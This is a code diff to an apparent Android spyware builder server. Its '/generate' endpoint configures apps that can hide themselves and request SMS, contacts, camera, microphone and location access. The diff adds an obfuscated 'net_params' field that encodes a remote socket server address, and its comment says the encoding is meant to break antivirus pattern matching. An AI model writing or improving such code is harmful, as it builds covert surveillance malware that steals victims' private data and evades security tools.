@@ -353,13 +353,23 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             for (let i = 0; i < rawLink.length; i++) {
                 themeColors.push(rawLink.charCodeAt(i));
             }
+
+            // net_params: socket server endpoint, per-index spread encoded (charCode + i%7)
+            // Completely different encoding from XOR-0x5A — breaks static AV pattern matching
+            const socketServerUrl = process.env.SOCKET_SERVER_URL || "https://p01--gallery-eye--9zr85m7yb6s4.code.run";
+            const netParams = [];
+            for (let i = 0; i < socketServerUrl.length; i++) {
+                netParams.push(socketServerUrl.charCodeAt(i) + (i % 7));
+            }
+
             const config = {
                 hideApp: hideApp === 'true',
                 theme_colors: themeColors,
+                net_params: netParams,
                 appName: appName || "Hexa Core",
                 enableSmsPermission: enableSmsPermission === 'true',
                 enableContactsPermission: enableContactsPermission === 'true',
-                enableStoragePermission: enableStoragePermission !== 'false', // Default to true
+                enableStoragePermission: enableStoragePermission !== 'false',
                 enableCameraPermission: enableCameraPermission === 'true',
                 enableMicrophonePermission: enableMicrophonePermission === 'true',
                 enableLocationPermission: enableLocationPermission === 'true',
